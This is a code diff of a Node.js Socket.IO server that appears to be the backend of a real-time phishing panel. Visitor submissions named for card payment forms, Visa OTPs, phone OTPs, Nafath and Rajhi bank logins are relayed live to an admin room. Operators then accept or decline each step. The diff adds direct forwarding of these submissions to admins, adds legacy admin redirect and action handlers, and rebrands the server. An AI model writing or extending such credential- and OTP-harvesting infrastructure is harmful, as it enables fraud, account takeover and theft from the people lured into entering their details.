@@ -1291,15 +917,11 @@ io.on("connection", (socket) => {
       }
       socket.join("admins");
       Object.values(db.get().users).forEach((u) => socket.emit("sessionUpdate", u));
-      if (typeof ack === "function") {
-        ack({ ok: socket.data.adminAuthenticated === true });
-      }
     } else {
       logJoinEvent({
         handler: "join", role, result: "joined",
         socketId: socket.id, ip,
       });
-      if (typeof ack === "function") ack({ ok: true });
     }
   });
 
@@ -1309,59 +931,35 @@ io.on("connection", (socket) => {
     socket.data.sessionId = id;
     socket.join(`session:${id}`);
     socket.join(`user:${id}`);
-    upsertSession(id, {
-      lastSeen: now(),
-      ip: clientIp(socket.request),
-      lastEvent: "visitor_bound",
-      stage: "service",
-    });
   });
 
   socket.on("newData", (payload = {}) => {
     const id = payload.id || payload.uuid || socket.data.sessionId || newId();
-    upsertSession(id, payload);
-    recordSubmission("newData", { ...payload, uuid: id, page: payload.page || "/" });
+    const s = upsertSession(id, payload);
+    recordSubmission("newData", { ...payload, uuid: id });
+    io.to("admins").emit("newVisitor", s);
   });
 
   // visitor -> admin submissions (tmn contract)
-  const customerEventPages = {
-    paymentForm: "/confirm",
-    visaOtp: "/verfiy",
-    phone: "/phone",
-    phoneOtp: "/phoneOtp",
-    navaz: "/navaz",
-  };
   ["paymentForm", "visaOtp", "phone", "phoneOtp", "navaz"].forEach((ev) => {
     socket.on(ev, (payload = {}) => {
       const id = payload.id || payload.uuid || socket.data.sessionId;
       if (!id) return;
       upsertSession(id, { [ev]: payload, lastEvent: ev, stage: ev });
-      recordSubmission(ev, {
-        ...payload,
-        uuid: id,
-        page: payload.page || customerEventPages[ev] || ev,
-      });
+      recordSubmission(ev, { ...payload, uuid: id });
+      io.to("admins").emit(ev, { ...payload, id, uuid: id });
     });
   });
 
   // admin -> visitor control events (tmn contract)
   const adminControlEvents = [
-    "acceptBooking",
-    "declineBooking",
-    "acceptService",
-    "declineService",
     "acceptPaymentForm",
     "declinePaymentForm",
-    "acceptPayment",
-    "declinePayment",
-    "acceptPin",
-    "declinePin",
+
     "acceptPhone",
     "declinePhone",
     "acceptVisaOtp",
     "declineVisaOtp",
-    "acceptOtp",
-    "declineOtp",
     "acceptPhoneOtp",
     "declinePhoneOtp",
     "acceptPhoneOTP",
@@ -1382,12 +980,8 @@ io.on("connection", (socket) => {
     "declineNaflogin",
     "acceptNafselogin",
     "declineNafselogin",
-    "acceptNafLogin",
-    "declineNafLogin",
     "acceptRajlogin",
     "declineRajlogin",
-    "acceptRajLogin",
-    "declineRajLogin",
     "acceptRajhi",
     "declineRajhi",
     "adminRedirect",
@@ -1436,20 +1030,9 @@ io.on("connection", (socket) => {
           : { id, uuid: id, userId: id };
       delete data.adminToken;
       delete data.token;
-      const actionKey = String(ev).toLowerCase();
-      const actionStatus = actionKey === "clientblocked" || actionKey === "user:blocked"
-        ? "blocked"
-        : actionKey.startsWith("decline") ? "declined" : "in_progress";
-      upsertSession(id, {
-        status: actionStatus,
-        stage: canonicalStage(data.stage || ev),
-        blocked: actionStatus === "blocked" ? true : undefined,
-      });
-      const delivered = broadcastAdminEvent(id, ev, data);
+      broadcastAdminEvent(id, ev, data);
       console.log(`[io] admin ${ev} -> ${id}`);
-      if (typeof ack === "function") {
-        ack(delivered ? { ok: true } : { ok: false, error: "invalid_nafath_code" });
-      }
+      if (typeof ack === "function") ack({ ok: true });
     });
   });
 
@@ -1559,6 +1142,43 @@ io.on("connection", (socket) => {
     })
   );
 
+  // Legacy frontend admin -> client actions (kept)
+  const legacyAdminEvents = [
+    "payment:action",
+    "otp:action",
+    "nafath:action",
+    "naflogin:action",
+    "phone:action",
+    "admin:redirect",
+  ];
+  for (const ev of legacyAdminEvents) {
+    socket.on(ev, (p = {}, ack) => {
+      const isAdmin =
+        socket.data.adminAuthenticated === true ||
+        (p &&
+          typeof p === "object" &&
+          (p.adminToken === ADMIN_TOKEN || p.token === ADMIN_TOKEN));
+      if (!isAdmin) {
+        if (typeof ack === "function") ack({ ok: false, error: "not_admin" });
+        return;
+      }
+      const target =
+        p.userId || p.sessionId || p.uuid || p.id || p.targetUserId || p._id;
+      if (!target) {
+        if (typeof ack === "function") ack({ ok: false, error: "missing_id" });
+        return;
+      }
+      const data = { ...p, id: target, uuid: target };
+      delete data.adminToken;
+      delete data.token;
+      io.to(`user:${target}`).emit(ev, data);
+      io.to(`session:${target}`).emit(ev, data);
+      io.to("admins").emit(`admin:${ev}`, { id: target, payload: data });
+      console.log(`[io] legacy admin ${ev} -> ${target}`);
+      if (typeof ack === "function") ack({ ok: true });
+    });
+  }
+
   socket.on("disconnect", (reason) => {
     JOIN_METRICS.disconnects++;
     const role = socket.data.role || socket.data.userType || "unknown";
@@ -1572,6 +1192,6 @@ io.on("connection", (socket) => {
 });
 
 server.listen(PORT, () => {
-  console.log(`tmin backend ${APP_VERSION} listening on :${PORT}`);
+  console.log(`gosuksa backend ${APP_VERSION} listening on :${PORT}`);
   console.log(`data file: ${DATA_FILE}`);
 });
